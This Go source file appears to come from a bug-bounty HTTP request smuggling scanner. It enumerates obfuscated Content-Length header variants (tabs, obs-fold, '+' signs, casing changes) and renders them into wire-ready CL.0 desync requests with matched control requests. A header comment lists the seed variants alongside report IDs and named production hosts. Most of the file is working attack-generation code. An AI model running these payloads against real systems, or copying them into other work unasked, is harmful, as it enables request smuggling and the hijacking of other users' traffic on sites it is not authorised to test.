// Package technique turns a report into a FAMILY, and a family into rows.
//
// THE BET. Nine findings across five programs are members of ONE family, found by hand between
// 2023 and 2026:
//
//	\tContent-Length: 101        #2357178 vcc-*.8x8.com   #2358526 citrix-waap
//	Content-Length \r\n : 31     #2356849 vcc-*.8x8.com   (obs-fold)
//	Content-Length\t:\t31        #2431300 voapi.8x8staging.com
//	Content-Length: +31          #2444112 cdn.agoda.net   #2456548 playtika
//	                             #2509057 #2509198 fusionfabric.cloud
//	content-length: +29          #2413017 playtika        (lowercased)
//
// One idea — make the front-end fail to see Content-Length, so it forwards a body the back-end
// reads as the start of a new request. Members four, five and six of that family were found one
// per year, by hand. Enumerating the idea yields all of them at once, and the ones nobody has
// tried with them.
//
// TestFamiliesRegenerateEveryReportedRequest is what keeps this honest: if a family cannot
// regenerate its own known members, this is a wordlist with extra steps. Same contract as
// vectors.TestRulePredictsEveryKnownBypass, which does it for the fold space.
package technique

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"regexp"
	"sort"
	"strings"
)

// Axis separates the two bug shapes the corpus contains. They share nothing but a socket:
// framing is a disagreement about where a body ENDS, injection is a disagreement about which
// bytes mean NEWLINE.
type Axis string

// ONE VOCABULARY FOR THE TWO AXES, everywhere.
//
// THE NAMES ARE THE FIELD'S, NOT THIS REPO'S. `split` and `smuggle` are what the two bugs are
// called everywhere outside this codebase — CWE-444 request splitting, and request smuggling. They
// were `framing`/`injection` here and `frame`/`fold` in `detect.Row`: FOUR names for TWO things,
// none of which an outside reader would recognise, and joining `techniques` to a findings table on
// `axis` matched nothing while raising nothing, because `'framing' = 'frame'` is simply false.
//
// `fold` and `framing` survive in prose below, deliberately: they name the MECHANISM (a codepoint
// that folds a line; a disagreement about message framing). The bug is what goes in the column.
const (
	AxisSmuggle Axis = "smuggle" // two parsers disagree about where a body ENDS
	AxisSplit   Axis = "split"   // a disagreement about which bytes mean NEWLINE
)

// Casing is the third dimension, and it is in the corpus: #2413017 is #2444112 lowercased.
// A stack that normalises header names before comparing sees one header; a stack that does not
// sees two, and that is the same disagreement by another route.
type Casing string

const (
	CasePreserve Casing = "preserve"
	CaseLower    Casing = "lower"
	CaseUpper    Casing = "upper"
)

// Row is one expanded member: rendered bytes with the slot tokens still in them. This is what
// lands in the `techniques` Dataset. Identity is RequestHex, which is over the TEMPLATE — slots
// included — never over a sent request.
type Row struct {
	RequestHex  string   `json:"request_hex"`
	RequestText string   `json:"request_text"`
	Axis        Axis     `json:"axis"`
	Class       string   `json:"class"`
	Family      string   `json:"family"`
	Variant     string   `json:"variant"`
	Slots       []string `json:"slots"`
	Tier        int      `json:"tier"`
	Provenance  string   `json:"provenance"`
	Explanation string   `json:"explanation"`

	// HeaderLine is the one line the family varies. Kept out of band because the regeneration
	// test compares against it directly, and because a human triaging a lead wants to see the
	// gadget without diffing two whole requests.
	HeaderLine string `json:"header_line"`

	// ControlText is THE SAME REQUEST WITH THE GADGET REMOVED — byte-identical everywhere except
	// that `{HEADER}` holds a well-formed `Content-Length: ${cl}` instead of the obfuscated line.
	//
	// ── WHY THE CORPUS CARRIES THIS AND NOT JUST THE ATTACK ─────────────────────────────────────
	//
	// The splitting axis has always had a matched control ("the same encoding one value higher")
	// and FOLDSCAN records it taking that axis from 26 false positives to 0. This axis had none,
	// and said so in a comment: "A framing technique has no matched control (there is no 'one
	// value higher' than `Connection: Content-Length`)."
	//
	// That reasoning was about the GADGET and it skipped the question the oracle actually needs
	// answered. The signal here is "the body was read as a request", and the claim being made is
	// that THE OBFUSCATION caused it. The control for that claim is not a different gadget — it
	// is NO gadget, with everything else held fixed. If a server reads the body as a request when
	// the Content-Length is perfectly well-formed and correct, it is ignoring Content-Length
	// altogether: that is pipelining, it happens to every client that sends two requests, and it
	// is not a desync.
	//
	// The first campaign shipped two reports without this and both were retracted, by exactly
	// this test run by hand: `Content-Length: 0` fired on paypalobjects.com 3 times in 6 while
	// the obfuscated attacks fired 1 and 2. The scanner had no way to notice.
	//
	// THE BODY IS IDENTICAL AND THE CANARY IS IDENTICAL. Varying either would reintroduce the
	// mistake that produced those retractions — a control that changes two things at once
	// answers neither question.
	ControlText string `json:"control_text"`
}

// Position is WHERE the hole goes in the header line. Each renders the whole line, because
// several of them touch more than one spot: `around-colon` puts the hole on both sides, and
// `obs-fold` spans two physical lines.
type Position struct {
	ID     string
	Render func(name, hole, value string) string
}

// Seed is a member that was actually paid for. Seeds are tier 1 — they become the class
// representatives the host screen sends — and they are what the regeneration test asserts.
type Seed struct {
	Report string // 'h1:2357178'
	Line   string // the exact header line, as reported
	CL     string // what the Content-Length value was, so the line can be reconstructed
}

// Family is a template with one hole and a domain to fill it from. Expansion is offline and
// happens once; the Family itself never reaches the lake.
type Family struct {
	ID          string
	Class       string
	Axis        Axis
	HeaderName  string // 'Content-Length'
	Template    string // carries ${slot} tokens and one {HEADER} line
	Positions   []Position
	Domain      []string
	Casings     []Casing
	Seeds       []Seed
	Explanation func(pos, hole string) string
}

var slotRe = regexp.MustCompile(`\$\{([a-z_]+)\}`)

// Expand renders every member once. Called by the offline extraction, never at scan time.
//
// `${cl}` is left UNBOUND on purpose. It is a slot, not a hole: the deliberately wrong value is
// chosen per send, and baking one in here would make every row in the family test the same
// mismatch. That is the trap smuggler.py's __REPLACE_CL__ sets for anyone who reads it as a
// convenience rather than as the attack.
func (f Family) Expand() []Row {
	seen := map[string]bool{}
	out := make([]Row, 0, len(f.Positions)*len(f.Domain)*len(f.Casings))

	for _, c := range f.Casings {
		name := applyCasing(f.HeaderName, c)
		for _, p := range f.Positions {
			for _, h := range f.Domain {
				line := p.Render(name, h, "${cl}")

				// A member that renders to a well-formed header line tests nothing, and a screen
				// carrying it wastes a probe on every host in scope. Dropping it is correctness,
				// not a cost saving.
				if isWellFormed(line, name) {
					continue
				}
				text := strings.Replace(f.Template, "{HEADER}", line, 1)
				h6 := digest(text)
				if seen[h6] {
					// Two positions can collide — `after-name` with 0x20 and `around-colon` with
					// 0x20 differ only in the second hole. First spelling wins; identity is the
					// bytes, so keeping both would put one technique in the corpus twice and
					// double its weight in every count.
					continue
				}
				seen[h6] = true

				out = append(out, Row{
					RequestHex:  hex.EncodeToString([]byte(text)),
					RequestText: text,
					HeaderLine:  line,
					// `name+": ${cl}"` is `isWellFormed`'s own definition of an un-obfuscated
					// line, reused rather than re-spelled: the control has to be exactly the
					// thing that check rejects members for being, or the two drift and the
					// control stops being the attack minus its gadget.
					ControlText: strings.Replace(f.Template, "{HEADER}", name+": ${cl}", 1),
					Axis:        f.Axis,
					Class:       f.Class,
					Family:      f.ID,
					Variant:     fmt.Sprintf("%s-%s-%s", p.ID, hexOf(h), c),
					Slots:       slotsIn(text),
					Tier:        f.tierOf(line),
					Provenance:  f.provenanceOf(line),
					Explanation: f.Explanation(p.ID, h),
				})
			}
		}
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Variant < out[j].Variant })
	return out
}

// tierOf is 1 for a member that regenerates a Seed and 2 otherwise. Tier 1 is what the host
// screen sends: proven, paid, highest prior. Everything else waits for a reaction in its class.
func (f Family) tierOf(line string) int {
	for _, s := range f.Seeds {
		if strings.Replace(line, "${cl}", s.CL, 1) == s.Line {
			return 1
		}
	}
	return 2
}

func (f Family) provenanceOf(line string) string {
	var got []string
	for _, s := range f.Seeds {
		if strings.Replace(line, "${cl}", s.CL, 1) == s.Line {
			got = append(got, s.Report)
		}
	}
	if len(got) == 0 {
		return "family:" + f.ID
	}
	return strings.Join(got, ",")
}

// Bindings are the slot values for one send. The crawl supplies most of them; `CL` is the
// caller's, because a deliberately wrong Content-Length is the attack and not a detail.
type Bindings struct {
	Host        string
	Endpoint    string
	HeaderBlock string
	Random      string
	CL          string
}

// Render substitutes slots and returns wire bytes. Slots are substituted HERE and nowhere else,
// so the bytes that go on the wire are the bytes an operator can print.
func (r Row) Render(b Bindings) ([]byte, error) {
	repl := map[string]string{
		"host":         b.Host,
		"endpoint":     orDefault(b.Endpoint, "/"),
		"header_block": b.HeaderBlock,
		"random":       b.Random,
		"cl":           b.CL,
	}
	var missing []string
	out := slotRe.ReplaceAllStringFunc(r.RequestText, func(m string) string {
		k := slotRe.FindStringSubmatch(m)[1]
		v, ok := repl[k]
		if !ok {
			missing = append(missing, k)
			return m
		}
		return v
	})
	if len(missing) > 0 {
		// An unbound slot renders a literal `${tenant}` onto the wire and the probe silently
		// tests nothing. Fail at the call site instead.
		return nil, fmt.Errorf("unbound slot(s): %s", strings.Join(missing, ", "))
	}
	return []byte(out), nil
}

// RenderAutoCL renders twice: once to measure the body this template produces, then again with
// ${cl} bound to that length. Returns the wire bytes and the body length it used.
//
// FOR CL.0 THE CONTENT-LENGTH IS CORRECT, and getting this backwards produces a scanner that
// tests nothing. The attack is not a wrong number — it is that the OBFUSCATED HEADER LINE hides a
// correct number from one of the two parsers. The front-end reads it, forwards the body, and the
// back-end never saw a Content-Length at all, so it reads zero bytes and the body stays in the
// socket to prefix whatever lands next.
//
// A deliberately WRONG length is a different family (CL.TE, TE.CL), which is why Render still
// takes the caller's value and TestCLIsNeverAutoComputed guards that path. Both exist on purpose.
//
// Two passes are exact rather than approximate: ${cl} only ever appears in the header block, so
// substituting a different number cannot change the length of the body being measured.
func (r Row) RenderAutoCL(b Bindings) ([]byte, int, error) {
	probeB := b
	probeB.CL = "0"
	first, err := r.Render(probeB)
	if err != nil {
		return nil, 0, err
	}
	n := bodyLen(first)
	b.CL = fmt.Sprintf("%d", n)
	out, err := r.Render(b)
	return out, n, err
}

// RenderControlAutoCL renders {@link Row.ControlText} the same way {@link Row.RenderAutoCL}
// renders the attack: measure the body with a placeholder length, then re-render with the real
// one.
//
// THE TWO MUST AGREE ON THE BODY OR THE CONTROL PROVES NOTHING. They do by construction — the
// control differs from the attack only inside the header line, which is before the CRLFCRLF that
// `bodyLen` measures from — and `TestTheControlIsTheAttackMinusItsGadget` pins it rather than
// leaving it to that argument.
//
// The returned length is the body length, which for the control is also the value that goes in
// the header. That is the whole point: a conforming server consumes exactly those bytes as a
// body and never sees a request line, so a canary that comes back anyway came back from a server
// that is not reading Content-Length at all.
func (r Row) RenderControlAutoCL(b Bindings) ([]byte, int, error) {
	if r.ControlText == "" {
		return nil, 0, fmt.Errorf("technique %s has no control text", r.Variant)
	}
	ctl := Row{RequestText: r.ControlText, Slots: slotsIn(r.ControlText), Variant: r.Variant}
	return ctl.RenderAutoCL(b)
}

// bodyLen is everything after the first CRLFCRLF. A template with no terminator has no body, and
// a family whose gadget is an obs-fold deliberately contains a lone CRLF mid-header — so this
// looks for the double, never the single.
func bodyLen(raw []byte) int {
	i := strings.Index(string(raw), "\r\n\r\n")
	if i < 0 {
		return 0
	}
	return len(raw) - (i + 4)
}

func applyCasing(s string, c Casing) string {
	switch c {
	case CaseLower:
		return strings.ToLower(s)
	case CaseUpper:
		return strings.ToUpper(s)
	default:
		return s
	}
}

// isWellFormed reports whether a rendered line is just `Name: value` with nothing hostile in it.
func isWellFormed(line, name string) bool {
	return line == name+": ${cl}"
}

func slotsIn(s string) []string {
	seen := map[string]bool{}
	var out []string
	for _, m := range slotRe.FindAllStringSubmatch(s, -1) {
		if !seen[m[1]] {
			seen[m[1]] = true
			out = append(out, m[1])
		}
	}
	sort.Strings(out)
	return out
}

func digest(s string) string {
	sum := sha256.Sum256([]byte(s))
	return hex.EncodeToString(sum[:8])
}

func hexOf(s string) string {
	var b strings.Builder
	for _, c := range []byte(s) {
		fmt.Fprintf(&b, "%02x", c)
	}
	return b.String()
}

func orDefault(s, d string) string {
	if s == "" {
		return d
	}
	return s
}
